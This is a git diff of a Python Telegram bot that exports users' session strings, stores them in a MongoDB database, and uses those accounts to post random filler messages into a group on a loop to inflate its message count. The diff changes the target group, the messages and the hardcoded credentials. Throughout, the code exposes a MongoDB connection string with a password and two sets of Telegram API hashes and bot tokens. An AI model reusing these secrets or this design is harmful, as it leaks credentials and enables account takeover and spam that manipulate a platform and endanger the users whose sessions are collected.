@@ -24,10 +24,9 @@ from config import *
 client = MongoClient('mongodb+srv://logi:logi@cluster0.kistqqd.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
 db = client['clients']  # Replace with your database name
 collection = db['clients_collection']  # Replace with your collection name
-
-api_id = 24398746
-api_hash = "b9077f84ac40e5615ff02c6f964924f9"
-bot_token = "6647197919:AAHQpQyUdztZPt4W-LYekZpR0_ZQHg92G9g"
+api_id = 9059897
+api_hash = "3834503034d02e7c361322db75222798"
+bot_token = "7245394722:AAFsojK9WXLy17BzGrs9dP9-93tHK6t464w"
 
 def load_clients():
     try:
@@ -45,56 +44,19 @@ clients = load_clients()
 
 client_objects = []
 whisper_messages = [
-    "I saw a shooting star tonight.",
-    "The night is full of secrets.",
-    "Can you hear the whispers in the wind?",
-    "Stars are the dreams of the universe.",
-    "The moonlight dances on the water.",
-    "I heard a secret in the breeze.",
-    "The night sky is a storyteller.",
-    "Listen closely to the silence.",
-    "The stars are whispering your name.",
-    "In the stillness, find your peace.",
-    "The night holds many mysteries.",
-    "Dreams are woven in the dark.",
-    "The whispers of the past are near.",
-    "The wind carries ancient tales.",
-    "The night is alive with whispers.",
-    "Can you feel the night’s embrace?",
-    "The moon sings a silent lullaby.",
-    "Every star has a story to tell.",
-    "The darkness hides many secrets.",
-    "Listen to the whispers of the night.",
-    "The stars are silent watchers.",
-    "The night sky is a canvas of dreams.",
-    "The breeze carries whispers of love.",
-    "The night is a world all its own.",
-    "The stars are guides in the dark.",
-    "The moon whispers sweet nothings.",
-    "In the dark, dreams take flight.",
-    "The night sky holds endless wonder.",
-    "The whispers of the wind are near.",
-    "The stars are ancient storytellers.",
-    "The night hides whispers of hope.",
-    "The breeze brings whispers of joy.",
-    "The night is a symphony of silence.",
-    "The stars are whispers of light.",
-    "The moon watches over us all.",
-    "The night is a whisper of calm.",
-    "The stars shine with quiet whispers.",
-    "The night whispers secrets to the stars.",
-    "The breeze carries whispers of peace.",
-    "The night is full of whispered dreams.",
-    "The stars are silent whispers of time.",
-    "The night brings whispers of magic.",
-    "The wind whispers through the trees.",
-    "The stars are whispers in the dark.",
-    "The night is a whisper of serenity.",
-    "The moon whispers ancient secrets.",
-    "The night sky whispers to the soul.",
-    "The stars are whispers of the universe.",
-    "The night whispers lullabies to the stars.",
-    "The whispers of the night are near."
+"""இதயங்கள் அருகில் இருக்கும் பொழுது,
+இருக்கும் இடங்கள் ஒன்றும் தூரமில்லை...""",
+"""நேரம் நெருங்க விடாமல் தடுப்பதால்,
+நினைவு துளிகளில் தவிக்கிறேன்!""",
+"""தவிக்கும் இரு நெஞ்சம்,
+தடுமாறுகிறது என் நெஞ்சம்!
+என் காலடி கெஞ்சும் உன் வருகைக்காக!""",
+"""தொலைவால் தூரத்தில் இருந்தாலும்
+என் நினைவால் நெஞ்சோரத்தில் நீ...""",
+"""நீ என்னை தவிர்ப்பதும்,
+நான் உனக்காக தவிப்பதுமே நம் காதலாகிவிட்டது!""",
+"""தூரங்கள் பிரிவில்லை, என் துணையே!
+துயிலில் சந்திப்போம் வா என் கானாவில்"""
 ]
 app = Client(
     "my_bot",
@@ -119,7 +81,7 @@ async def start_the_client():
         try:
             if cli[2]:
                 await insta_cli.start()
-            await insta_cli.join_chat("tamil_worldchat")
+            await insta_cli.join_chat("homies_town")
         except Unauthorized as e:
             #await app.send_message(1955509952,text=f"Error {e} \n removed account : [account](tg://user?id={cli[0]})")
             try:
@@ -145,7 +107,7 @@ async def start(cli,message):
     caption = f"""
 Hello {message.from_user.first_name} , 
 
-~  This Bot Mainly created for @tamil_worldchat to increase the message count.
+~  This Bot Mainly created for @homies_town to increase the message count.
 ~  Some basic idealogy was used for this creation .
 ~  This is not gonne be a spam , beacuse message will send at a specific interval.
 ~  for more information use /help .
@@ -268,7 +230,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
         string_session = await client.export_session_string()
         instn_cli = Client(f"client{user_id}",api_id=api_id,api_hash=api_hash ,session_string=string_session)
         try:
-            await instn_cli.join_chat("tamil_worldchat")
+            await instn_cli.join_chat("homies_town")
         except Exception as e:
             pass
         clients.append([msg.from_user.id , string_session , False])
@@ -328,7 +290,7 @@ async def start_message():
     while(True):
         for i in client_objects:
                 try:
-                    await i[1].send_message(-1002208263384,random.choice(whisper_messages),reply_to_message_id=random.randint(700,800))
+                    await i[1].send_message(-1001506877923,random.choice(whisper_messages),reply_to_message_id=224819)
                     time.sleep(2)
 
                 except Unauthorized as e:
@@ -357,7 +319,7 @@ async def start_message():
 
 @app.on_message(filters.command("message") & filters.private)
 async def messageon(cli,mes):
-    result = await app.ask(mes.chat.id ,text="Plese Join Here @tamil_worldchat after that send __yes__ , you already joined means also send __yes__ here")
+    result = await app.ask(mes.chat.id ,text="Plese Join Here @homies_town after that send __yes__ , you already joined means also send __yes__ here")
     if result.text == "yes" or "Yes":
         for cli in clients:
             if cli[0] == mes.from_user.id:
